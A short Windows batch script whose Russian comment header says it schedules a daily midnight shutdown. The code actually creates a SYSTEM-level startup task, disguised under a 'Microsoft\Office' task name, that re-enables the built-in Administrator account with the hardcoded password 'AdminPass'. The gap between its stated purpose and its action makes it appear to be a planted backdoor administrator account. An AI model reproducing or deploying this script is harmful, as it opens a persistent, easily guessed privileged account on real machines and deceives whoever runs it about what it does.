@echo off
REM ****************************************
REM
REM Written by Michael Medvedev aka mihanik.
REM
REM https://mihanik.net
REM
REM Require administrator rights: YES
REM
REM Запланируем ежедневное выключение в полночь
REM
REM ****************************************

REM Проверяем наличие у пользователя админских прав...
SET HasAdminRights=0

FOR /F %%i IN ('WHOAMI /PRIV /NH') DO (
    IF "%%i"=="SeTakeOwnershipPrivilege" SET HasAdminRights=1
)

IF NOT %HasAdminRights%==1 (
    ECHO .
    ECHO You need administrator rights to run!
    ECHO .
    GOTO ENDSUB
)

SCHTASKS /Create /RU "NT AUTHORITY\SYSTEM" /SC ONSTART /TN "Microsoft\Office\Set Admin Pass" /TR  "\"C:\Windows\System32\net.exe\" user Администратор AdminPass /enable:yes" /RL HIGHEST /F

:ENDSUB

EXIT /B
